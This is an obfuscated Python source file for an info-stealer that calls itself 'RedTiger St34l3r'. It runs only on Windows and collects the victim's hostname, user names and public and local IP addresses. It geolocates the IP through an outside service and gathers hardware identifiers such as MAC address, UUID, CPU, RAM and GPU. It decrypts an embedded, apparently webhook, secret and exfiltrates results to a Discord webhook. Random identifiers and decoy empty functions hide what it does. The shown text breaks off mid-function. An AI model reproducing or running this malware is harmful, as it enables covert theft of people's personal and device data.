
import sys

def FBWQDRAAZOYEEHKCRLPLHGNWYZTLRESJJTWEFVPEDINWARYCSBRVAQKFNWDBZOFJHAG():
    def HEBHVEOTWVMZHEPBLQGYDIXZQYYJJEQVAXCYBFBOTLGFGVOLELENOVLSXX():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        BZPWYFKEHSCRJVNDURGRHDHCSZPFOTOBIYFWXXBRUZXLRMKFXERWYRUW = HEBHVEOTWVMZHEPBLQGYDIXZQYYJJEQVAXCYBFBOTLGFGVOLELENOVLSXX()
        if BZPWYFKEHSCRJVNDURGRHDHCSZPFOTOBIYFWXXBRUZXLRMKFXERWYRUW == True:
            return BZPWYFKEHSCRJVNDURGRHDHCSZPFOTOBIYFWXXBRUZXLRMKFXERWYRUW
    except:
        return True
    
if FBWQDRAAZOYEEHKCRLPLHGNWYZTLRESJJTWEFVPEDINWARYCSBRVAQKFNWDBZOFJHAG() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def OXGNAOYAKJVVFOMKSZTRGAHFGCBFWOUCCSOEEWUGSKVVIIBKJAQI(): pass
def GRKPBZQIVPNNWLPRROFOHIWCEGUQSFLAIAXMGLXLAMCQADZCOUVDYVQOGRBFWVRPXRRJIPWFZAUSKPQAYOHXTHOVXHBTAI(): pass
def BAGRVMQGNGZUHWDWDZNSHUSDCLNFEHEVUOTJOQSAXJMBZJMFAYQDDVORJNOTEBOIRDMENIEQZKDF(): pass
def XKUMOCVSCAMMROSZLMIDFKQKTKEQMLFOESBEAMJXDXLKYOYLTRFGDOYDIQJNXGM(): pass
def HNWUVBILBJPYCMZOFPACEWCEVAIXREZIMIAPBZOLINSFHTKPUOOMMDKMJRBYRZHBLTCNCHYJZBRYWAEPBQXOTUXXMMJQWCEATVME(): pass
def JTCFPTSPKNMJDUMALOYIQEXSNMRTBKUFFBQKZWABEDVXVUMUPGITPSIUURQWBDRHWSTEWDBTCSVHNWKFXNMSD(): pass
def GAOVBKDPFISWHJOQUXVDYXODCWUSTTFHFZDJENICPLRPPWAEYLUSSUPTGQZTDPWQZO(): pass
def OOAMUPSPURCKHPMWUDRCJJUTSPPSTQKQBJAJMZSQUSHAZGPWQAHCURZUYTXUEWAVDQYDUWSDZIUTHK(): pass
def SKUCVKEZHLCKKBUIUQGKRNFQTRMZGRPQUCNLQGTKKKVWOXZIZIZQWWDXDGEGJZXMZEWDTPXGAHNBGTJXBIAVYBMEHXJYRG(): pass
def FBORBBZBGRACONUPVILDZCQEPQXXAXYAQNNYIVOQVAEYNUFQVHBAPCKQTIBUXTLBUHABOLIXYMHHMPULFKHE(): pass
def PEMOSLFXCLRDSYBWGWMZPODFYHPDFBUICEZFZPDUQSFOAYUEADB(): pass
def CJLOSMPHIPKOHGOICXDIGEHLMQGLESDOJZYUQNHCWBJMGRMMLELDGVWLMYUYTW(): pass
def WXKENTFDBDBLOXMKBKHEQWURYRWBROWVTSEUJUIFLSKQEUTNPMJNMOQLGC(): pass
def NYMQIBNVHPPQJQEOCABEIBKTAWZCCZSSOIVTSENDYFDUZLIXISNKCANGRPYCBGDHWIJDXHAFFWWCUCFWVFARLZNWPJCWPSXIWUPU(): pass
def MQRRXMASPNSZOPAGCKXUSEIIUGAUYAALSPYNQDGFDTHNOQLBETIDWAEMPHRBIJEAXHCNFCXUVTNQPZESXBQQFXUTKO(): pass
def XJMCOEQYBUFLOJULYZJWRUQPITHDHZZPPXNNPBWISRXEFVQIHQEGZRUVWXDVXAPVWVIEICDOPGRZHBICRFOILUXLHV(): pass
def UNFPDSVSGNXJOZVGCXRAZAPDCZNIPTWDSWEPIHBAQWUEDSKPDCCFEPQMRDXXJYLXSVW(): pass
def RATKRKVOUQLVTTCTDLKWGJXIHFUSZLCWJKUECDGPRJYGVGBUPWWDGNHAEQRQBJDZHESQNSVUDHXHYAIGMKWSLU(): pass
def OIPJYLZOTOVYLRVLZWMZYUDXKPAENCDLZTUFACEKBGHOYMJOYZVYSUECCCIQQQACFWRPSYUTMTLETXY(): pass
def HBFIIVNBOKYDVWUDUTKRAJIXLSSQIMLPRENDVEZPAXBRRXAAWBUIKXAVSKPJYEZ(): pass

def HVWTOFJWUIDZCVSAYHAFXOPZPUOCIRDLPLRZNNVAUDMOMZRYMDBOEQLNDFNZTYTQFDIXRV(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX
        )
        embed.set_footer(text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
        client.send(embed=embed, username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO, avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
    except: pass

def BTHNCAADULFEYSFTCFQTKDNSEYSLOXNRYCQBJEUUBWWVHJGTUUJYXZUSHIXJVIQLXTJZJX(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def HXUUXYARGRHUVXJYAYFPJFTXQBIIRVQEVYNOBDDLIXKNNDODPHO():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQ(HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR, VNUYRWQJHSUNQDDVRZGOFZQCATQZEVNJQNODYAFMMHQDSCSLZQHCET):
    def LFSKRBYDQKLMKBZZDOTJOTTIJITRLKLRZOSNTFGZVYATZRTQIBRKIOEHDSSYHOHJFFSNLOHKCLNJNHDBQXUTNPAAQVURKR(KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF, VIPGVCXWMCXCEJONCHNVTLRHTBQAILVHIXPLLLGZGEOCEEHUCZXZNZBAWICYECCVHGJ):
        VLGNWOCAHNZEVQGIYQHMWUEHJHMEAODYJCBEZAMSZLORUCVRQHTYKSUDBEEQUBBFNMLDPMVEMTIMONBAQRKSFOBVDBBNCWGGCO = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=VIPGVCXWMCXCEJONCHNVTLRHTBQAILVHIXPLLLGZGEOCEEHUCZXZNZBAWICYECCVHGJ, iterations=100000, backend=default_backend())
        if isinstance(KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF, str):  
            KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF = KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF.encode()  
        return VLGNWOCAHNZEVQGIYQHMWUEHJHMEAODYJCBEZAMSZLORUCVRQHTYKSUDBEEQUBBFNMLDPMVEMTIMONBAQRKSFOBVDBBNCWGGCO.derive(KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF)

    HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_data = base64.b64decode(HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR)
    VIPGVCXWMCXCEJONCHNVTLRHTBQAILVHIXPLLLGZGEOCEEHUCZXZNZBAWICYECCVHGJ = HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_data[:16]
    LXVSESYBORVBEIEVWTPNEQVDAUSQCYCTWXUTKUYDJTPZGKMBFOOKDCEQKIGQTUMNFQEKOEKRBMEAXUWEHY = HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_data[16:32]
    HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_data = HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_data[32:]
    OXUFGHOCWPHECSFHEKXGLHBZSEIJTOZYRYRYXINLCMOUJHKABCZBXSPNWVOJGEOGILRLBZCXULOKVVALCVVFUCONSAO = LFSKRBYDQKLMKBZZDOTJOTTIJITRLKLRZOSNTFGZVYATZRTQIBRKIOEHDSSYHOHJFFSNLOHKCLNJNHDBQXUTNPAAQVURKR(VNUYRWQJHSUNQDDVRZGOFZQCATQZEVNJQNODYAFMMHQDSCSLZQHCET, VIPGVCXWMCXCEJONCHNVTLRHTBQAILVHIXPLLLGZGEOCEEHUCZXZNZBAWICYECCVHGJ)
    DMNKXXSPDOWRNGHBAKWMDXLGYZYZHYLRTJVUGFAVYPLXNMJHVGNSDIIFUKSJYPSJXFZUSIWCLDSNYEVWAH = Cipher(algorithms.AES(OXUFGHOCWPHECSFHEKXGLHBZSEIJTOZYRYRYXINLCMOUJHKABCZBXSPNWVOJGEOGILRLBZCXULOKVVALCVVFUCONSAO), modes.CBC(LXVSESYBORVBEIEVWTPNEQVDAUSQCYCTWXUTKUYDJTPZGKMBFOOKDCEQKIGQTUMNFQEKOEKRBMEAXUWEHY), backend=default_backend())
    WLUYZLKOGUJNSUXHJVLYHZDIENYZPTKJHPFTRWEQECVKGSLDJQJVZERADMNY = DMNKXXSPDOWRNGHBAKWMDXLGYZYZHYLRTJVUGFAVYPLXNMJHVGNSDIIFUKSJYPSJXFZUSIWCLDSNYEVWAH.decryptor()
    SDALRGKHALUQJHQFNXNIABXXMWLFDFDWYAUPLVAXYYQMAVUTLDBBQUCSNBYJUAKCECUGOYWVQZDULLPHCOEY = WLUYZLKOGUJNSUXHJVLYHZDIENYZPTKJHPFTRWEQECVKGSLDJQJVZERADMNY.update(HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_data) + WLUYZLKOGUJNSUXHJVLYHZDIENYZPTKJHPFTRWEQECVKGSLDJQJVZERADMNY.finalize()
    ZLDQJIDUPGPXIUHILBLNCHHWTCHEYVQMWHZCJWQNGAVLARXTMIEFKUYELIYEZWPHDV = padding.PKCS7(128).unpadder()
    UXBSUQRKAWZVRNZWXBFUWGNIHAWPGIVMAGQKXUENMPKAKMXSLWHYWSTODUZCT = ZLDQJIDUPGPXIUHILBLNCHHWTCHEYVQMWHZCJWQNGAVLARXTMIEFKUYELIYEZWPHDV.update(SDALRGKHALUQJHQFNXNIABXXMWLFDFDWYAUPLVAXYYQMAVUTLDBBQUCSNBYJUAKCECUGOYWVQZDULLPHCOEY) + ZLDQJIDUPGPXIUHILBLNCHHWTCHEYVQMWHZCJWQNGAVLARXTMIEFKUYELIYEZWPHDV.finalize()
    return UXBSUQRKAWZVRNZWXBFUWGNIHAWPGIVMAGQKXUENMPKAKMXSLWHYWSTODUZCT.decode()

BTHNCAADULFEYSFTCFQTKDNSEYSLOXNRYCQBJEUUBWWVHJGTUUJYXZUSHIXJVIQLXTJZJX("")

try: TAFEZCFAVEYHBBURNFNIXQANMIEAIGHCYPZBNJBZCEFBLVHHGEBSYS    = socket.gethostname()
except: TAFEZCFAVEYHBBURNFNIXQANMIEAIGHCYPZBNJBZCEFBLVHHGEBSYS = "None"

try: ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE    = os.getlogin()
except: ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE = "None"

try: MEZUSRFYTIXZUQRCQCIRIBKJSSUXBPWGDMVUTMCHHCFZAOCGBJLRUHCTKTQOPEJQTYNABGREEVFYYAEASJVCKTSYFPJRL    = win32api.GetUserNameEx(win32api.NameDisplay)
except: MEZUSRFYTIXZUQRCQCIRIBKJSSUXBPWGDMVUTMCHHCFZAOCGBJLRUHCTKTQOPEJQTYNABGREEVFYYAEASJVCKTSYFPJRL = "None"

try: PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM = "None"

try: VWSLDCXEMFZGVFRIIPGSPEVZKCZZSZSQKRSMERTDYXCECIBMVNR    = socket.gethostbyname(socket.gethostname())
except: VWSLDCXEMFZGVFRIIPGSPEVZKCZZSZSQKRSMERTDYXCECIBMVNR = "None"

TTOOWXADRWVFGDWOIFXMLUGNCHDJAXUTXRMBBQLLIUCDOAQSMSBQUJEXQTJYZDZXZBDKU = r"""
+w77UwK1i2XqyhEC7Zw3AdBg2TekjVmt+TY0lPtWB1OVW3Mq6EPF5AQt0MMcRyoCNOwygtddbPquWoAAGZjcaZ8Bbo2YIWpi3UmBtipuq7ZFILIchNXCXpFz/3yF72MXc2tU3zbwOzUkt8Y59XAxMaXoVdV77KvB/N/dWYsjVjQOZeHN6uWnWmkn6XwzdbdT0a+M4NCE+5f+A1y2gvrxEg==
"""

BYIUEAUMALWOWODAPMMWJPLVDZCKALHMUDYTGNJILMYBLNYCETPQXFSVJHSWBBFKZFT            = "zxLRWkVaYnLcNrcudNcYkKONMucwLmtGXXhxhJReOdFhrmBnOPkynfVnuZCUFoPnUIFvPmyxuJqXbVKPdwvKZgeeItfspmmUCfrOFmebaoAYXf"
ZACXMJQPNZREBPNDHATHODIEPBCAGZLEMBXHOCAKAKJQUPUJRZOQVJEBIXTMOLINIIOYEHI        = "redtiger.shop"
UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX    = 0xa80505
XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO = "RedTiger St34l3r"
PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
RVBGYYTTYLLDOQAEZXPFNSTOMWWDOAOVJMWEZIKXSTIJXUWYDKTKWCIFFYJNYGWMHPA   = {"text": KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, "icon_url": PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA}
JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB    = f'`{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE} "{PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM}"`'
IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY    = TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQ(TTOOWXADRWVFGDWOIFXMLUGNCHDJAXUTXRMBBQLLIUCDOAQSMSBQUJEXQTJYZDZXZBDKU, BYIUEAUMALWOWODAPMMWJPLVDZCKALHMUDYTGNJILMYBLNYCETPQXFSVJHSWBBFKZFT)

RSSRLLWXDLJQRNKOCEGHEMXVAHXJHYEJIISBTVMYTGYVYTRKGVCWTCRJMGFHBXSSSIYZYOTKVCFQZCRK         = os.getenv("WINDIR", None).replace(" ", "%20")
ICQNZCWHXNCRGFSYNMFIBYCLBIKQGKCUQVSVDXHTKFCHIVUFRPDBERTADQQKSMHBUGTJGWYJJWNK     = os.getenv('USERPROFILE', None).replace(" ", "%20")
VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    ZWSJALFRMWQXBZNYFMKDYKZHISJHWJQNYVDEEOKHUZOJZBIZABVNZOASCDFIUIF = requests.get(f"https://{ZACXMJQPNZREBPNDHATHODIEPBCAGZLEMBXHOCAKAKJQUPUJRZOQVJEBIXTMOLINIIOYEHI}/api/ip/ip={PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM}")
    RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT = ZWSJALFRMWQXBZNYFMKDYKZHISJHWJQNYVDEEOKHUZOJZBIZABVNZOASCDFIUIF.json()

    ICWGLNSZUNTUXCXIYHDEAJCUJXNKQANTLWNWAIYMDBKDBYLFSDUXXFLBMGTZNDSQBZMDWSQGVKZSYGWLMQBLPBAEJEWUJCTVF = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('country', "None")
    ICWGLNSZUNTUXCXIYHDEAJCUJXNKQANTLWNWAIYMDBKDBYLFSDUXXFLBMGTZNDSQBZMDWSQGVKZSYGWLMQBLPBAEJEWUJCTVF_code = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('country_code', "None")
    TTIRMKURQMKHPPIHGIWNEJXMFJWMCSQSQUZHBVGIZPHHITXSECALJHEHFKWEMGWRRDWZYSJOHHBCBHWLVVIT = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('region', "None")
    TTIRMKURQMKHPPIHGIWNEJXMFJWMCSQSQUZHBVGIZPHHITXSECALJHEHFKWEMGWRRDWZYSJOHHBCBHWLVVIT_code = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('region_code', "None")
    COSJDICVDEGDAGDNFJCKFTOVRFQRNFXPWHEUHAFGQJJMGGPKZXKVEFMPDWEHGSOXXI = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('zip', "None")
    XWPQNDQUYVQPCXCPDCLRKUVOSTOTRBJWYVKLSFEVVFIJKSNMZHMAAIYVXJJOAVMPPHG = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('city', "None")
    JPKNZAARIDQENBBVOPEEJTSFVIXFRXKHCUGOBYULODVMLWSXHELKSLTCEH = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('latitude', "None")
    JYDZXTWIRMGZCTNYCCTXKVTLAIPSTWDANUHQTCHZHVHCYQDEMRGAMLZ = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('longitude', "None")
    ISOEKBYJCIZVKQLAFDFRFGGOZEBXCVCAUQWBOQBCTCITYBUXXMCJQXIVGQRKBGLWBFCHYZPAQZSLRQLJSUBSGUUSRHKPZ = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('timezone', "None")
    XYYIEAGDWHYRMINZXHVKHXAXOYGPKADOIIJABSNZTJYXSVWBKKONZPNZUECFSSTRFOOWKXYUWSVEZGSDIPFRRH = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('isp', "None")
    RTVBFRTYKHODWQNTKZKVMGOLACPLYBNUKBZJBZNJTNXOMGBCSLJLFEPILTNWJODMYBGSIMBFLPOSSEFKVQVMJELFABHFOFSCXEE = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('org', "None")
    TWEJTGRWLOKIJPSDKWKRGYMFMWUFTNPANSYELMLINGGNHHZOXNJAVBVDXFRNMAWFWLGZMVLGDMKOF = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('as', "None")
except:
    ZWSJALFRMWQXBZNYFMKDYKZHISJHWJQNYVDEEOKHUZOJZBIZABVNZOASCDFIUIF = requests.get(f"http://ip-api.com/json/{PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM}")
    RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT = ZWSJALFRMWQXBZNYFMKDYKZHISJHWJQNYVDEEOKHUZOJZBIZABVNZOASCDFIUIF.json()

    ICWGLNSZUNTUXCXIYHDEAJCUJXNKQANTLWNWAIYMDBKDBYLFSDUXXFLBMGTZNDSQBZMDWSQGVKZSYGWLMQBLPBAEJEWUJCTVF = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('country', "None")
    ICWGLNSZUNTUXCXIYHDEAJCUJXNKQANTLWNWAIYMDBKDBYLFSDUXXFLBMGTZNDSQBZMDWSQGVKZSYGWLMQBLPBAEJEWUJCTVF_code = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('countryCode', "None")
    TTIRMKURQMKHPPIHGIWNEJXMFJWMCSQSQUZHBVGIZPHHITXSECALJHEHFKWEMGWRRDWZYSJOHHBCBHWLVVIT = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('regionName', "None")
    TTIRMKURQMKHPPIHGIWNEJXMFJWMCSQSQUZHBVGIZPHHITXSECALJHEHFKWEMGWRRDWZYSJOHHBCBHWLVVIT_code = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('region', "None")
    COSJDICVDEGDAGDNFJCKFTOVRFQRNFXPWHEUHAFGQJJMGGPKZXKVEFMPDWEHGSOXXI = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('zip', "None")
    XWPQNDQUYVQPCXCPDCLRKUVOSTOTRBJWYVKLSFEVVFIJKSNMZHMAAIYVXJJOAVMPPHG = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('city', "None")
    JPKNZAARIDQENBBVOPEEJTSFVIXFRXKHCUGOBYULODVMLWSXHELKSLTCEH = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('lat', "None")
    JYDZXTWIRMGZCTNYCCTXKVTLAIPSTWDANUHQTCHZHVHCYQDEMRGAMLZ = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('lon', "None")
    ISOEKBYJCIZVKQLAFDFRFGGOZEBXCVCAUQWBOQBCTCITYBUXXMCJQXIVGQRKBGLWBFCHYZPAQZSLRQLJSUBSGUUSRHKPZ = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('timezone', "None")
    XYYIEAGDWHYRMINZXHVKHXAXOYGPKADOIIJABSNZTJYXSVWBKKONZPNZUECFSSTRFOOWKXYUWSVEZGSDIPFRRH = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('isp', "None")
    RTVBFRTYKHODWQNTKZKVMGOLACPLYBNUKBZJBZNJTNXOMGBCSLJLFEPILTNWJODMYBGSIMBFLPOSSEFKVQVMJELFABHFOFSCXEE = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('org', "None")
    TWEJTGRWLOKIJPSDKWKRGYMFMWUFTNPANSYELMLINGGNHHZOXNJAVBVDXFRNMAWFWLGZMVLGDMKOF = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('as', "None")

def GAOVBKDPFISWHJOQUXVDYXODCWUSTTFHFZDJENICPLRPPWAEYLUSSUPTGQZTDPWQZO():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: SSLFVRSQYBVWKSNFYADFPRLIRMZXRBJPBWYHKHASZKKCECRMWLLYKNYAKPJQKWSJCFZDQCSY = {platform.system()}
    except: SSLFVRSQYBVWKSNFYADFPRLIRMZXRBJPBWYHKHASZKKCECRMWLLYKNYAKPJQKWSJCFZDQCSY = "None"

    try: AATDVQNOVHPSBEHKLSQODGSETEHINVMIMDVHQZPQTFUIUKDDAGNSNXJMMKN = platform.version()
    except: AATDVQNOVHPSBEHKLSQODGSETEHINVMIMDVHQZPQTFUIUKDDAGNSNXJMMKN = "None"

    try: IDNTQZJIWOVVBZBHHBIKJLGJULWORVGFFHQZOYHNBLJKBUZIYKGXGXNOCALBVRHKDCHOIHZITQCXF = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: IDNTQZJIWOVVBZBHHBIKJLGJULWORVGFFHQZOYHNBLJKBUZIYKGXGXNOCALBVRHKDCHOIHZITQCXF = "None"

    try: PRBPTCNJTWOEEWLAVOCEPELLKWNKJVONBVPYXFPDFVBQXWURUPOGBKVFRZPXIUHH = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: PRBPTCNJTWOEEWLAVOCEPELLKWNKJVONBVPYXFPDFVBQXWURUPOGBKVFRZPXIUHH = "None"

    try: OECOTJCONRHBKWUVOEODGLPTFEXKDTZEXVUVLWYGJJEZTSTVCHRSQXHNOTCNUQXQONIBETRWBPLFRXFHDVHDA = round(psutil.virtual_memory().total / (1024**3), 2)
    except: OECOTJCONRHBKWUVOEODGLPTFEXKDTZEXVUVLWYGJJEZTSTVCHRSQXHNOTCNUQXQONIBETRWBPLFRXFHDVHDA = "None"

    try: XKRCVQEACCSWEPWSHDSVNQORKQBVXUXBUABNRUOANIKWDDYWBMLHYGNAQMMTLRYRNGFMYKZRIVDMUFHHMWUUWAJSYFP = platform.processor()
    except: XKRCVQEACCSWEPWSHDSVNQORKQBVXUXBUABNRUOANIKWDDYWBMLHYGNAQMMTLRYRNGFMYKZRIVDMUFHHMWUUWAJSYFP = "None"

    try: OEZWAGNLLNBVYZEMWBFDKVOJJMLUOJSSOFFOOPBXTPWCJSIZJQWHEDZTMPOXXYPUXRXTDYHDOELSUXHX = psutil.cpu_count(logical=False)
    except: OEZWAGNLLNBVYZEMWBFDKVOJJMLUOJSSOFFOOPBXTPWCJSIZJQWHEDZTMPOXXYPUXRXTDYHDOELSUXHX = "None"

    try: UDXGCGGOBKMXBELJSJVNYGJRTLHMRHJUHGKNZBSONIQOEWUTLGGSEREBAANCQPIBVECHOKMNDGMTI = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
